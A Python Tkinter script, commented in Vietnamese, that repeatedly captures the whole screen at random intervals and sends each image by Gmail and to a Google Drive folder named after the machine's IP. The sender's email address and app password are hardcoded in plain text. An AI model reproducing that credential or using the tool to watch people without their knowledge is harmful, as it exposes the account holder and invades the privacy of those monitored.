import smtplib
import os
import socket
import tkinter as tk
import threading
import time
import random
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from datetime import datetime
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload

# Lấy địa chỉ IP của thiết bị
def get_ip():
    ip = socket.gethostbyname(socket.gethostname())
    return ip

# Tạo thư mục lưu ảnh trên máy tính local
def get_save_folder():
    ip = get_ip()
    save_folder = os.path.join("image", ip)
    if not os.path.exists(save_folder):
        os.makedirs(save_folder)  # Tạo thư mục nếu chưa tồn tại
    return save_folder

# Chụp ảnh màn hình và lưu vào thư mục local
def capture_screenshot():
    screenshot = ImageGrab.grab(all_screens=True)  # Chụp toàn bộ màn hình
    save_folder = get_save_folder()
    filename = os.path.join(save_folder, f"screenshot_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
    screenshot.save(filename)  # Lưu ảnh với tên có chứa thời gian
    return filename

# Gửi email với file đính kèm
def send_email_with_attachment(attachment_path):
    try:
        FROM_EMAIL = "nghia1951220039@gmail.com"
        PASSWORD = "qheypggadodxlddp"  # Mật khẩu ứng dụng của Email gửi
        TO_EMAIL = "nghia1951220039@gmail.com"
        ip = get_ip()
        SUBJECT = f"{ip}"  # Tiêu đề email là địa chỉ IP
        current_time = datetime.now().strftime('%d/%m/%Y_%H:%M:%S')
        BODY = f"Ảnh chụp màn hình từ IP {ip} lúc {current_time}"

        # Cấu trúc email
        msg = MIMEMultipart()
        msg['From'] = FROM_EMAIL
        msg['To'] = TO_EMAIL
        msg['Subject'] = SUBJECT
        msg.attach(MIMEText(BODY, 'plain'))

        # Đính kèm ảnh chụp màn hình
        with open(attachment_path, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
            msg.attach(part)

        # Cấu hình máy chủ gửi email
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()  # Bảo mật kết nối
            server.login(FROM_EMAIL, PASSWORD)
            server.sendmail(FROM_EMAIL, TO_EMAIL, msg.as_string())

        print("Email đã được gửi thành công!")
    except Exception as e:
        print(f"Đã xảy ra lỗi khi gửi email: {e}")

# Tải ảnh lên Google Drive
def upload_to_drive(file_path):
    SCOPES = ['https://www.googleapis.com/auth/drive.file']
    
    # Kiểm tra nếu token.json có tồn tại và lấy thông tin đăng nhập
    creds = None
    if os.path.exists('token.json'):
        creds = Credentials.from_authorized_user_file('token.json', SCOPES)
    
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
            creds = flow.run_local_server(port=0)
        
        # Lưu thông tin đăng nhập vào token.json
        with open('token.json', 'w') as token:
            token.write(creds.to_json())

    # Tạo dịch vụ Google Drive
    service = build('drive', 'v3', credentials=creds)

    # Lấy IP làm tên thư mục
    ip = get_ip()
    folder_name = ip
    query = f"mimeType='application/vnd.google-apps.folder' and name='{folder_name}'"
    print(f"Querying for folder: {query}")

    # Tìm thư mục trên Google Drive
    try:
        results = service.files().list(q=query, fields="files(id, name)").execute()
        folder = results.get('files', [])
        print("Folder search result:", folder)

        # Nếu thư mục chưa tồn tại, tạo thư mục mới
        if not folder:
            folder_metadata = {
                'name': folder_name,
                'mimeType': 'application/vnd.google-apps.folder'
            }
            folder = service.files().create(body=folder_metadata, fields='id').execute()
            print(f"Create Folder - Folder created with ID: {folder['id']}")
            
            # Sau khi tạo thư mục mới, tiếp tục upload ảnh vào thư mục này
            folder_id = folder['id']
        else:
            # Nếu thư mục đã tồn tại, sử dụng ID của thư mục đó
            folder_id = folder[0]['id']
            print(f"Using existing folder with ID: {folder_id}")

        # Đưa ảnh vào thư mục vừa tạo
        file_metadata = {
            'name': os.path.basename(file_path),
            'parents': [folder_id]
        }
        media = MediaFileUpload(file_path, mimetype='image/png')

        # Tải ảnh lên thư mục
        uploaded_file = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
        print(f"File uploaded to Google Drive with ID: {uploaded_file['id']}")
        print(f"Upload to Drive Success is folder: {folder_id}")

    except Exception as e:
        print(f"An error occurred: {e}")

# Chạy liên tục công cụ chụp ảnh, gửi email và tải ảnh lên Drive
running = False
def run_tool():
    global running
    while running:
        screenshot_path = capture_screenshot()
        send_email_with_attachment(screenshot_path)
        upload_to_drive(screenshot_path)
        # Xóa ảnh local sau khi đã gửi email và tải lên Drive
        # os.remove(screenshot_path)
        
        time_screen = random.randint(1, 100)
        print(f"Ảnh chụp màn hình tiếp theo sau: {time_screen}s")
        time.sleep(time_screen)

# Bắt đầu hoặc dừng thread
def toggle_tool(button):
    global running
    if not running:
        running = True
        button.config(text="Stop", bg="red")  # Thay đổi nút thành "Stop" khi công cụ đang chạy
        threading.Thread(target=run_tool).start()  # Chạy công cụ trong thread riêng
        #messagebox.showinfo("Thông báo", "Bắt đầu chụp màn hình!")
    else:
        running = False
        button.config(text="Start", bg="white")  # Thay đổi nút thành "Start" khi dừng
        #messagebox.showinfo("Thông báo", "Đã dừng chụp màn hình!")

# Tạo giao diện người dùng
root = tk.Tk()
root.title("Screenshot Email Tool")
root.geometry("300x150")
toggle_button = tk.Button(root, text="Start", command=lambda: toggle_tool(toggle_button), font=("Arial", 14), width=10, bg="white")
toggle_button.pack(pady=40)

# Chạy giao diện người dùng
root.mainloop()